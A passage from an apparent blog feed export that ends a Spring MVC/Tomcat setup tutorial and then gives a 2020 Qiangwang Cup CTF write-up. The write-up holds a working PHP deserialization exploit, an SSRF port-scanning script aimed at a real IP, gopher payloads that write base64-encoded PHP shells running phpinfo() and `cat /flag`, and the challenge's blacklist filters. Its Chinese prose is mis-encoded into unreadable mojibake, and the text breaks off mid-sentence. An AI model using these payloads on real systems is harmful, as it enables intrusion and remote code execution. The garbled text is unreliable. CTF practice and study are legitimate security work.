resolver.setViewClass(org.springframework.web.servlet.view.JstlView<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            resolver.setPrefix(<span class="string">"/WEB-INF/views/"</span>);</span><br><span class="line">            resolver.setSuffix(<span class="string">".jsp"</span>);</span><br><span class="line">            resolver.setExposeContextBeansAsAttributes(<span class="keyword">true</span>);</span><br><span class="line">            <span class="keyword">return</span> resolver;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">configureDefaultServletHandling</span><span class="params">(DefaultServletHandlerConfigurer configurer)</span> </span>&#123;</span><br><span class="line">            configurer.enable();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// é™æ€èµ„æºé…ç½®</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        &lt;mvc:resources mapping="css/**" location="/WEB-INF/views/css/"/&gt;</span></span><br><span class="line"><span class="comment">        &lt;mvc:resources mapping="/js/**" location="/WEB-INF/views/js/"/&gt;</span></span><br><span class="line"><span class="comment">        &lt;mvc:resources mapping="/images/**" location="/WEB-INF/views/images/"/&gt;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addResourceHandlers</span><span class="params">(ResourceHandlerRegistry registry)</span> </span>&#123;</span><br><span class="line">            registry.addResourceHandler(<span class="string">"/css/**"</span>).addResourceLocations(<span class="string">"/WEB-INF/views/css/"</span>);</span><br><span class="line">            registry.addResourceHandler(<span class="string">"/js/**"</span>).addResourceLocations(<span class="string">"/WEB-INF/views/js/"</span>);</span><br><span class="line">            registry.addResourceHandler(<span class="string">"/images/**"</span>).addResourceLocations(<span class="string">"/WEB-INF/views/images/"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œï¼Œ</p>
<p><img src="/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/image-20200902155802861.png" alt="image-20200902155802861"></p>
<h1 id="å‘ç‚¹ï¼š"><a href="#å‘ç‚¹ï¼š" class="headerlink" title="å‘ç‚¹ï¼š"></a>å‘ç‚¹ï¼š</h1><ol>
<li><p>tomcatæ§åˆ¶å°ä¹±ç é—®é¢˜ï¼šä¿®æ”¹tomcatçš„/confç›®å½•çš„logging.propertiesä¸‹å›¾ä¸­æŒ‡ç¤ºä½ç½®ä¸ºGBKã€‚</p>
<p><img src="/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/image-20200831124317263.png" alt="image-20200831124317263"></p>
</li>
<li><p>æŠ¥é”™<code>ä¸¥é‡ [RMI TCP Connection(3)-127.0.0.1] org.apache.tomcat.util.modeler.BaseModelMBean.invoke Exception</code></p>
<blockquote>
<ol>
<li>åœ°å€å¿˜äº†åŠ â€œ/â€</li>
</ol>
<ul>
<li>ä½ çš„ä¸šåŠ¡å¤„ç†å±‚<strong>Servletæ³¨è§£</strong></li>
<li>ä½ ä½¿ç”¨web.xmlå†™çš„<strong>url-pattern</strong></li>
</ul>
<ol>
<li>ä½ ç¼–è¯‘è¿‡é¡¹ç›®åç”Ÿæˆäº†targetæ–‡ä»¶å¤¹ï¼ˆå­˜æ”¾ä½ çš„é¡¹ç›®å­—èŠ‚ç æ–‡ä»¶ï¼‰ï¼Œä½ åˆä¿®æ”¹äº†é¡¹ç›®æŸæ–‡ä»¶åæˆ–ç±»åï¼Œé‡å¯Tomcatå°±ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µã€‚åˆ é™¤<strong>targetæ–‡ä»¶å¤¹</strong>ï¼Œåœ¨é‡å¯Tomcatå³å¯ã€‚<br>ï¼ˆæˆ‘çš„æƒ…å†µï¼Œè‡ªå·±ä¿®æ”¹äº†ä¸ªå®ä½“ç±»åç§°ï¼Œå¯¼è‡´ç±»åŠ è½½æ— æ³•æ‰¾åˆ°ï¼‰</li>
</ol>
<p><a href="https://blog.csdn.net/weixin_46718393/article/details/107706822" target="_blank" rel="noopener">å‚è€ƒ</a></p>
</blockquote>
</li>
</ol>
<h1 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h1><p><a href="https://segmentfault.com/a/1190000021712028" target="_blank" rel="noopener">IntelliJ IDEA æ­å»ºSpringMVCå¹¶ç”¨MAVENé…ç½®</a></p>
<p><a href="https://blog.csdn.net/fenglailea/article/details/78280686" target="_blank" rel="noopener">IntelliJ IDEAä¸Šåˆ›å»ºMaven Spring MVCé¡¹ç›®</a></p>
<p><a href="https://blog.csdn.net/u013642500/article/details/85271965" target="_blank" rel="noopener">ã€ä»æ— åˆ°æœ‰ã€‘IDEA + maven + java web + springMVC + Tomcat é¡¹ç›®æ­å»º</a></p>
]]></content>
  </entry>
  <entry>
    <title>2020å¼ºç½‘æ¯éƒ¨åˆ†é¢˜ç›®writeup</title>
    <url>/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/</url>
    <content><![CDATA[<p>å‰è¨€ </p>
<a id="more"></a>

<h1 id="0x01-half-infiltration"><a href="#0x01-half-infiltration" class="headerlink" title="0x01 half_infiltration"></a>0x01 half_infiltration</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$flag=file_get_contents(<span class="string">'ssrf.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">global</span> $result;</span><br><span class="line">        <span class="keyword">print</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age,$sex,$num;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $student = <span class="keyword">$this</span>-&gt;age;</span><br><span class="line">        $boy = <span class="keyword">$this</span>-&gt;sex;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;num;</span><br><span class="line">    	$student-&gt;$boy();</span><br><span class="line">    	<span class="keyword">if</span>(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student)))</span><br><span class="line">    	&#123;</span><br><span class="line">        	ob_end_clean();</span><br><span class="line">        	<span class="keyword">exit</span>();</span><br><span class="line">    	&#125;</span><br><span class="line">   	 	<span class="keyword">global</span> $$a;</span><br><span class="line">    	$result=$GLOBALS[<span class="string">'flag'</span>];</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'x'</span>])) &#123;</span><br><span class="line">    unserialize($_GET[<span class="string">'x'</span>])-&gt;get_it();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€å±‚æ˜¯ä¸€é“ååºåˆ—åŒ–é¢˜ç›®ï¼Œæ·»åŠ äº†é™åˆ¶ï¼Œé¦–å…ˆè°ƒç”¨äº†<code>$student-&gt;$boy();</code>ï¼Œç„¶åå†å°†flagèµ‹ç»™å…¨å±€å˜é‡<code>$result</code>ï¼Œå¦‚æœåœ¨èµ‹flagå€¼ä¹‹å‰ï¼Œå°±è°ƒç”¨Passç±»çš„read()æ–¹æ³•æ˜¯è¯»ä¸åˆ°flagçš„ï¼Œæ‰€ä»¥éœ€è¦é¦–å…ˆè¿›è¡Œä¸€éå®Œæ•´çš„<code>User</code>çš„<code>__destruct()</code>å‡½æ•°ï¼Œå°†flagèµ‹ç»™<code>$result</code>,ç„¶åå†æ‰§è¡Œä¸€é<code>__destruct()</code>ï¼Œç»§ç»­è°ƒç”¨<code>$student-&gt;$boy();</code>æ¥è§¦å‘Passç±»çš„read()å‡½æ•°ï¼Œè¯»å–flagï¼›æ¥ä¸‹æ¥å†è¯»flagæ—¶å‘ç°åœ¨<code>ob_start()</code>å’Œ<code>ob_end_clean()</code>ä¹‹é—´çš„<code>print</code>æ˜¯è¾“å‡ºä¸åˆ°å±å¹•çš„ï¼Œè¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥ç»•è¿‡ï¼š</p>
<ol>
<li>åœ¨<code>ob_end_clean()</code>æ‰§è¡Œå‰å¯»æ‰¾ä¸€æ¡è§¦å‘åˆ°æ‰§è¡Œåˆ°exit()çš„é“¾ã€‚</li>
<li>åœ¨<code>ob_end_clean()</code>å‰æŠ¥é”™ï¼Œç›´æ¥åœæ­¢æ‰§è¡Œã€‚</li>
</ol>
<p>æœ¬é¢˜é€‰æ‹©ç¬¬äºŒç§ï¼Œåœ¨<code>print $result</code>ä¸<code>ob_end_clean()</code>ä¹‹é—´åªæœ‰åªæœ‰is_string()å’Œglobal ä¸¤æ¡è¯­å¥ï¼Œé€šè¿‡æµ‹è¯•å‘ç°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">va</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$a = <span class="string">"this"</span>;</span><br><span class="line">		<span class="keyword">global</span> $$a;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$b = <span class="keyword">new</span> va();</span><br><span class="line">$b-&gt;a();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//æ‰§è¡Œä¼šæŠ¥é”™</span></span><br></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pass</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		ob_start();</span><br><span class="line">		<span class="keyword">global</span> $result;</span><br><span class="line">		<span class="keyword">print</span> $result;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $age, $sex, $num;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$student = <span class="keyword">$this</span>-&gt;age;</span><br><span class="line">		$boy = <span class="keyword">$this</span>-&gt;sex;</span><br><span class="line">		$a = <span class="keyword">$this</span>-&gt;num;</span><br><span class="line">		$student-&gt;$boy();</span><br><span class="line">		<span class="keyword">if</span> (!(is_string($a)) || !(is_string($boy)) || !(is_object($student))) &#123;</span><br><span class="line">			ob_end_clean();</span><br><span class="line">			<span class="keyword">exit</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">global</span> $$a;</span><br><span class="line">		$result = $GLOBALS[<span class="string">'flag'</span>];</span><br><span class="line">		ob_end_clean();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Pass();</span><br><span class="line"></span><br><span class="line">$b2 = <span class="keyword">new</span> User();</span><br><span class="line">$b2-&gt;sex = <span class="string">"read"</span>;</span><br><span class="line">$b2-&gt;num = <span class="string">"this"</span>;</span><br><span class="line">$b2-&gt;age = $a;</span><br><span class="line"></span><br><span class="line">$d = <span class="keyword">new</span> <span class="keyword">Exception</span>;</span><br><span class="line">$b = <span class="keyword">new</span> User();</span><br><span class="line">$b-&gt;sex = <span class="string">"getCode"</span>;</span><br><span class="line">$b-&gt;num = <span class="string">"result"</span>;</span><br><span class="line">$b-&gt;aa = $b2;</span><br><span class="line">$b-&gt;age = $d;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br><span class="line"><span class="comment">//O%3A4%3A%22User%22%3A4%3A%7Bs%3A3%3A%22age%22%3BO%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A0%3A%22%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A41%3A%22D%3A%5C%E6%AF%94%E8%B5%9B202006%5C%E5%BC%BA%E7%BD%91%E6%9D%AF%5Cban+pen%5Cexp.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A37%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7Ds%3A3%3A%22sex%22%3Bs%3A7%3A%22getCode%22%3Bs%3A3%3A%22num%22%3Bs%3A6%3A%22result%22%3Bs%3A2%3A%22aa%22%3BO%3A4%3A%22User%22%3A3%3A%7Bs%3A3%3A%22age%22%3BO%3A4%3A%22Pass%22%3A0%3A%7B%7Ds%3A3%3A%22sex%22%3Bs%3A4%3A%22read%22%3Bs%3A3%3A%22num%22%3Bs%3A4%3A%22this%22%3B%7D%7D</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°ssrf.php</p>
<p>image-20200824111939809</p>
<p>ç¬¬äºŒå±‚åˆ©ç”¨ssrf.phpæ¢æµ‹å†…ç½‘ï¼Œ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://172.26.98.147:"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35000</span>,<span class="number">50000</span>):</span><br><span class="line">	url = <span class="string">"http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://172.26.98.147:"</span></span><br><span class="line">	url+=str(i)</span><br><span class="line">	re=requests.get(url)</span><br><span class="line">	<span class="keyword">print</span> url</span><br><span class="line">	<span class="keyword">if</span> <span class="string">"HTTP"</span> <span class="keyword">in</span> re.text:</span><br><span class="line">		<span class="keyword">print</span> url</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°åœ¨40000ç«¯å£å¼€äº†æœåŠ¡ï¼Œ</p>
<p><img src="/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/image-20200824112617077.png" alt="image-20200824112617077"></p>
<p>æ˜¯ä¸€ä¸ªè¯„è®ºæ¡†ï¼Œå¯ä»¥ä¼ fileå’Œcontentä¸¤ä¸ªå‚æ•°ï¼Œåœ¨<a href="http://127.0.0.1:40000/uploads/å¯ä»¥çœ‹åˆ°æ–‡ä»¶å¤¹ï¼Œæ–‡ä»¶å¤¹çš„åå¯¹åº”phpsessidå€¼ï¼Œåˆ©ç”¨gopheråè®®ssrfå¯ä»¥åœ¨uploadsç›®å½•å†™æ–‡ä»¶ã€‚" target="_blank" rel="noopener">http://127.0.0.1:40000/uploads/å¯ä»¥çœ‹åˆ°æ–‡ä»¶å¤¹ï¼Œæ–‡ä»¶å¤¹çš„åå¯¹åº”phpsessidå€¼ï¼Œåˆ©ç”¨gopheråè®®ssrfå¯ä»¥åœ¨uploadsç›®å½•å†™æ–‡ä»¶ã€‚</a></p>
<p>æ¯”èµ›æ—¶ç›´æ¥ç”¨</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;172.26.98.147:40000&#x2F;_POST%20&#x2F;%20HTTP&#x2F;index.php1.1%250d%250aHost:127.0.0.1:40000%250d%250aContent-Type:application&#x2F;x-www-form-urlencoded%250d%250aCookie:%20PHPSESSID&#x3D;o151hrta2onlamvpvsq9695785;%250d%250aContent-Length:%2083%250d%250a%250d%250afile&#x3D;php%3A%2F%2Ffilter%2Fconvert.base64-decode%2Fresource%3Da.php%26content&#x3D;PD89cGhwaW5mbygpOyAg</span><br></pre></td></tr></table></figure>

<p>å°±å¯ä»¥å¾—åˆ°phpinfoï¼Œä½†æ˜¯åæ¥å¤ç°æ—¶ï¼Œå°±ä¸å¯ä»¥äº†ï¼Œæ„Ÿè§‰é¢˜ç›®è¢«æ”¹äº†ã€‚23333</p>
<p>ä¹‹åä¿®æ”¹contentï¼Œç»•è¿‡è¿‡æ»¤å¾—åˆ°flagã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;172.26.98.147:40000&#x2F;_POST%20&#x2F;%20HTTP&#x2F;index.php1.1%250d%250aHost:127.0.0.1:40000%250d%250aContent-Type:application&#x2F;x-www-form-urlencoded%250d%250aCookie:%20PHPSESSID&#x3D;o151hrta2onlamvpvsq9695785;%250d%250aContent-Length:%2087%250d%250a%250d%250afile&#x3D;php%3A%2F%2Ffilter%2Fconvert.base64-decode%2Fresource%3Db.php%26content&#x3D;MjM8Pz1gY2F0IC9mbGFnYDsg</span><br></pre></td></tr></table></figure>

<img src="/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/image-20200824141727459.png" alt="image-20200824141727459" style="zoom: 200%;">

<p>content-length:é•¿åº¦ç›´æ¥æœ¬åœ°å¼€ä¸€ä¸ªä¸€æ‘¸ä¸€æ ·çš„æœåŠ¡ï¼Œçœ‹ä¸‹é•¿åº¦å³å¯ï¼Œ</p>
<img src="/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/image-20200824141850604.png" alt="image-20200824141850604" style="zoom:150%;">

<p>æˆåŠŸå†™å…¥æ–‡ä»¶ï¼Œå¾—åˆ°flag,</p>
<p><img src="/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/image-20200824141758218.png" alt="image-20200824141758218"></p>
<p>å°è¯•è¯»å–æºç ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">23&lt;?&#x3D;&#96;cat  ..&#x2F;..&#x2F;in*ex.***&#96;;</span><br></pre></td></tr></table></figure>

<img src="/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/image-20200824142827863.png" alt="image-20200824142827863" style="zoom:200%;">

<p>ä¸‹é¢æ˜¯åšé¢˜æ—¶è¯»å–çš„æœåŠ¡å™¨æ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#ini_set('display_errors', 'on');</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span> <span class="string">'del.php'</span>;</span><br><span class="line">$upload_dir = sprintf(<span class="string">"./uploads/%s/"</span>, session_id());</span><br><span class="line">$id = session_id();</span><br><span class="line">@mkdir($upload_dir, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">chdir($upload_dir);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>, <span class="string">'.'</span>);</span><br><span class="line"><span class="keyword">foreach</span> (glob(getcwd() . <span class="string">'/*'</span>) <span class="keyword">as</span> $file) &#123;</span><br><span class="line">	<span class="keyword">if</span> (is_file($file)) &#123;</span><br><span class="line">		unlink($file);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (time() - filemtime($file) &gt;= <span class="number">5</span>) &#123;</span><br><span class="line">			Delete($file);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data = <span class="string">""</span>;</span><br><span class="line">$filename = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'file'</span>])) &#123;</span><br><span class="line">	$filename = $_POST[<span class="string">'file'</span>];</span><br><span class="line">	<span class="keyword">if</span> (stripos($filename, <span class="string">'BE'</span>) === <span class="keyword">false</span> &amp;&amp; stripos($filename, <span class="string">'write'</span>) === <span class="keyword">false</span> &amp;&amp; stripos($filename, <span class="string">'zlib'</span>) === <span class="keyword">false</span> &amp;&amp; stripos($filename, <span class="string">'sto'</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'content'</span>])) &#123;</span><br><span class="line">			$data = $_POST[<span class="string">'content'</span>];</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (stripos($data, <span class="string">'ph'</span>) === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'Pz4='</span>) === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'&lt;?'</span>) === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'PD9wa'</span>) === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'script'</span>) === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'='</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">				file_put_contents($filename, $data);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"error"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//del.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Delete</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (is_dir($path) === <span class="keyword">true</span>) &#123;</span><br><span class="line">		$files = <span class="keyword">new</span> RecursiveIteratorIterator(<span class="keyword">new</span> RecursiveDirectoryIterator($path), RecursiveIteratorIterator::CHILD_FIRST);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">foreach</span> ($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">			<span class="keyword">if</span> (in_array($file-&gt;getBasename(), <span class="keyword">array</span>(<span class="string">'.'</span>, <span class="string">'..'</span>)) !== <span class="keyword">true</span>) &#123;</span><br><span class="line">				<span class="keyword">if</span> ($file-&gt;isDir() === <span class="keyword">true</span>) &#123;</span><br><span class="line">					rmdir($file-&gt;getPathName());</span><br><span class="line">				&#125; <span class="keyword">else</span> <span class="keyword">if</span> (($file-&gt;isFile() === <span class="keyword">true</span>) || ($file-&gt;isLink() === <span class="keyword">true</span>)) &#123;</span><br><span class="line">					unlink($file-&gt;getPathname());</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> rmdir($path);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> ((is_file($path) === <span class="keyword">true</span>) || (is_link($path) === <span class="keyword">true</span>)) &#123;</span><br><span class="line">		<span class="keyword">return</span> unlink($path);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢æ˜¯å¤ç°æ—¶è¯»çš„æœåŠ¡å™¨æ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#ini_set('display_errors', 'on');</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'del.php'</span>);</span><br><span class="line">$upload_dir = sprintf(<span class="string">"./uploads/%s/"</span>, session_id());</span><br><span class="line">$id=session_id();</span><br><span class="line">@mkdir($upload_dir, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">chdir($upload_dir);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>, <span class="string">'.'</span>);</span><br><span class="line"><span class="keyword">foreach</span> (glob(getcwd().<span class="string">'/*'</span>) <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_file($file)) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (time() - filemtime($file) &gt;= <span class="number">200</span>) &#123;</span><br><span class="line">            Delete($file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data = <span class="string">""</span>;</span><br><span class="line">$filename = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'file'</span>]) ) &#123;</span><br><span class="line">	$filename = $_POST[<span class="string">'file'</span>];</span><br><span class="line">	<span class="keyword">if</span>(stripos($filename, <span class="string">'..'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($filename, <span class="string">'BE'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($filename, <span class="string">'write'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($filename, <span class="string">'zlib'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($filename, <span class="string">'sto'</span>)  === <span class="keyword">false</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'content'</span>])) &#123;</span><br><span class="line">            $data = $_POST[<span class="string">'content'</span>];</span><br><span class="line">	    </span><br><span class="line">	    <span class="keyword">if</span> (stripos($data, <span class="string">'`'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($data, <span class="string">'ll'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($data, <span class="string">'PD8'</span>)  === <span class="keyword">false</span>   &amp;&amp;stripos($data, <span class="string">'-'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($data, <span class="string">'ww'</span>)  === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'6'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($data, <span class="string">'7'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($data, <span class="string">'rm'</span>)  === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'mr'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($data, <span class="string">'sy'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($data, <span class="string">'ys'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($data, <span class="string">'ph'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($data, <span class="string">'Pz4='</span>)  === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'&lt;?'</span>)  === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'PD9wa'</span>)  === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'script'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($data, <span class="string">'='</span>)  === <span class="keyword">false</span>) &#123;</span><br><span class="line">                file_put_contents($filename, $data);</span><br><span class="line">	    &#125;</span><br><span class="line">	</span><br><span class="line">	&#125; </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"error"</span>);</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯¹æ¯”å‘ç°åœ¨fileå¤„åŠ äº†<code>..</code>çš„è¿‡æ»¤ï¼Œåœ¨contentä¸­åŠ äº†</p>
